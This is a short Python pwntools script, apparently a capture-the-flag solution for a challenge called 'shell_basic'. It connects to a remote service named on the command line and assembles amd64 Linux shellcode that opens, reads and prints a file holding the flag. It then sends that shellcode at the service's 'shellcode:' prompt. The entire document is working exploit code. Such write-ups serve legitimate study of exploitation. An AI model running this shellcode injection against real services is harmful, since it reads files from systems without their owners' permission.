#! /usr/bin/env python3

import pwn
import sys

# pwn.context.log_level = "debug"

pwn.context.arch = "amd64"
pwn.context.os = "linux"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

file = "/home/shell_basic/flag_name_is_loooooong"

sc = pwn.shellcraft.open(file)
sc += pwn.shellcraft.read("rax", "rsp", 0x100)
sc += pwn.shellcraft.write(0x1, "rsp", 0x100)
sc = pwn.asm(sc)

r.sendafter(b"shellcode: ", sc)
pwn.success(str(r.recvall()))